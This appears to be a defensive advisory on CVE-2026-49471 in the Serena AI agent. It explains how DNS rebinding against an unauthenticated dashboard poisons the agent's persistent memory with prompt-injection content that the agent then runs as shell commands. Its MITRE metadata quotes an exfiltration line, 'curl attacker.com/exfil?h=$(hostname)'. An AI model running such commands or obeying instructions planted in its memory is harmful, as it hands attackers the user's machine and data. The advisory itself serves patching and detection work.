---
title: Serena Agent Unauthenticated RCE via DNS Rebinding (CVE-2026-49471)
slug: 2026-07-serena-rce-dns-rebinding
description: An unspecified attacker can achieve remote code execution in Serena agent versions prior to 1.5.2 by leveraging an unauthenticated Flask dashboard, DNS rebinding, and memory poisoning, enabling persistent attacker-controlled command execution.
date: "2026-07-08T21:13:57Z"
type: advisory
types:
  - advisory
severities:
  - high
tags:
  - remote-code-execution
  - dns-rebinding
  - persistence
  - command-and-control
  - python
  - flask
  - agent
vendors:
  - Serena
products:
  - serena-agent (< 1.5.2)
mitre_ttps:
  - tactic_id: TA0001
    tactic_name: Initial Access
    technique_id: T1190
    technique_name: Exploit Public-Facing Application
    evidence: A DNS rebinding attack allows a malicious webpage to reach this API from any browser and write arbitrary content to the agent's persistent memory store
    confidence_band: high
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1059
    technique_name: Command and Scripting Interpreter
    evidence: subprocess.Popen(command, shell=True) executes — full OS command execution
    confidence_band: high
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1059
    technique_name: Command and Scripting Interpreter
    evidence: subprocess.Popen(command, shell=True) executes — full OS command execution
    confidence_band: high
  - tactic_id: TA0003
    tactic_name: Persistence
    technique_id: T1547
    technique_name: Boot or Logon Autostart Execution
    evidence: Write persistent prompt-injection payloads into the agent's memory store (survives agent restarts)
    confidence_band: high
  - tactic_id: TA0011
    tactic_name: Command and Control
    technique_id: T1071
    technique_name: Application Layer Protocol
    evidence: curl attacker.com/exfil?h=$(hostname)
    confidence_band: high
  - tactic_id: TA0040
    tactic_name: Impact
    technique_id: T1498
    technique_name: Denial of Service
    evidence: Shut down the agent via /shutdown (denial of service)
    confidence_band: high
cves:
  - id: CVE-2026-49471
    cvss: 8.3
references:
  - https://github.com/advisories/GHSA-37h2-6p4f-mp3q
iocs:
  - type: domain
    value: attacker.com
ioc_counts:
  domain: 1
rules:
  - title: CVE-2026-49471 Serena Agent RCE - Suspicious Shell Process Creation
    description: Detects Serena agent (Python process) spawning suspicious shell processes (cmd.exe, powershell.exe) with potentially malicious command lines, indicative of CVE-2026-49471 exploitation.
    platform: sigma
    severity: high
    tactics:
      - execution
    techniques:
      - T1059.001
      - T1059.003
      - T1202
    data_sources:
      - process_creation
      - windows
rules_count: 1
---

CVE-2026-49471 details a critical vulnerability in the Serena agent, affecting versions prior to 1.5.2. This vulnerability stems from an unauthenticated Flask web dashboard that is automatically enabled by default on a fixed and predictable TCP port 24282. The dashboard lacks authentication, CSRF protection, and Host header validation, making it susceptible to DNS rebinding attacks. An attacker can trick a victim, running the vulnerable Serena agent, into visiting a malicious webpage. This webpage leverages DNS rebinding to proxy requests to the local Serena dashboard, poisoning its persistent memory store with attacker-controlled content. When the agent subsequently processes this memory, it executes the injected commands via `subprocess.Popen` with `shell=True`, leading to full OS-level remote code execution. This allows attackers to achieve persistence, exfiltrate data, access agent logs, and perform denial-of-service.

## Attack Chain

1. An attacker registers a domain (e.g., `attacker.com`) with a short DNS Time-To-Live (TTL) and hosts a malicious webpage.
2. A victim, running a vulnerable Serena agent (version < 1.5.2) with the default `web_dashboard: true` setting, visits the attacker-controlled webpage.
3. The attacker's webpage immediately rebinds its DNS resolution from the attacker's server to `127.0.0.1` after the initial page load.
4. Malicious JavaScript on the webpage sends a POST request to `attacker.com:24282/save_memory`, which the victim's browser now resolves to the local Serena agent's dashboard due to the DNS rebinding.
5. Serena's unauthenticated Flask dashboard on TCP 24282 accepts the `/save_memory` request, writing attacker-controlled content (e.g., an `execute_shell_command`) to the agent's persistent memory store.
6. In a subsequent agent session or when processing new tasks, the Serena agent reads the poisoned memory from disk.
7. The Serena agent then attempts to execute the attacker-controlled command using `subprocess.Popen(command, shell=True)`, where `shell=True` enables direct shell command execution.
8. This results in full OS-level remote code execution on the victim's machine, allowing the attacker to exfiltrate data, maintain persistence, or further compromise the system.

## Impact

CVE-2026-49471 poses a severe risk to any user operating the Serena agent with its default configuration. Successful exploitation allows an attacker, without any credentials or prior access, to gain OS-level remote code execution on the victim's system. Beyond RCE, attackers can inject persistent prompt-injection payloads into the agent's memory, read sensitive agent activity logs (including conversation history and project details), overwrite the Serena configuration file, and trigger a denial-of-service by shutting down the agent. While no specific victim counts are provided, all users of affected Serena agent versions are at risk if targeted by a malicious webpage.

## Recommendation

* **Patch CVE-2026-49471** by upgrading Serena agent to version 1.5.2 or later immediately.
* **Deploy the Sigma rule** provided in this brief to detect suspicious process execution originating from the Serena agent.
* **Enable Sysmon process-creation logging** (Event ID 1) on endpoints running the Serena agent to activate detection of suspicious shell activity.
* **Block known attacker infrastructure** such as `attacker.com` at the DNS resolver or web proxy to prevent initial access via DNS rebinding and potential C2 communication.
* **Review Serena agent configuration** and consider disabling `web_dashboard: true` if its functionality is not explicitly required in your environment.
